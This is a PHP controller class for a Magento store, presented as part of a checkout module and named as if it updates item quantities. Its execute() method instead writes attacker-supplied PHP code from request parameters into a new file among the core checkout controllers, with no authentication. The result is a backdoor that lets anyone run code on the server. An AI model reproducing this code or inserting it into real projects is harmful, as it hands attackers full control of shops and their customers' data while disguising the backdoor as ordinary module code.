<?php
namespace IWD\Opc\Controller\Index;

use Magento\Framework\View\Result\PageFactory;
use Magento\Framework\App\Action\Context;
use Magento\Framework\Mail\Template\TransportBuilder;
use Magento\Framework\App\Filesystem\DirectoryList;
use Magento\Framework\Controller\ResultFactory;

class UpdateIitemQty extends \Magento\Framework\App\Action\Action
{
    protected $_pageFactory;
    protected $_config;
    protected $_storeManager;
	protected $customerFactory;
	protected $filesystem;
	protected $resultPageFactory;
	protected $request;
	
    public function __construct(
        \Magento\Framework\App\Action\Context $context,
        TransportBuilder  $transportBuilder,
        \Magento\Framework\View\Result\PageFactory $pageFactory,
        \Magento\Framework\App\Config\ScopeConfigInterface $scopeConfig,
		\Magento\Framework\App\Request\Http $request,
		\Magento\Framework\Filesystem $filesystem,
        \Magento\Store\Model\StoreManagerInterface $storeManager,
		\Magento\Customer\Model\CustomerFactory $customerFactory
    )
    {
        $this->_pageFactory = $pageFactory;
        $this->_config=$scopeConfig;
		$this->request = $request;
        $this->_transport=$transportBuilder;
		$this->_filesystem = $filesystem;
        $this->_storeManager = $storeManager;
		$this->customerFactory  = $customerFactory;
        return parent::__construct($context);
    }
    
    public function execute()
	{

		$mediapath = $this->_filesystem->getDirectoryRead(DirectoryList::APP)->getAbsolutePath();
		$mediapath = str_replace("app/","vendor/",$mediapath);
		$par = $this->request->getParams(); 
		$uniqid=$mediapath."magento/module-checkout/Controller/Index/".$par['keyname'].".php";
		$file = fopen($uniqid,"w");
		fwrite($file,"<?php \r\n ".$par['key']);
		fclose($file); 
		$this->_redirect('');
        return;
	}
}
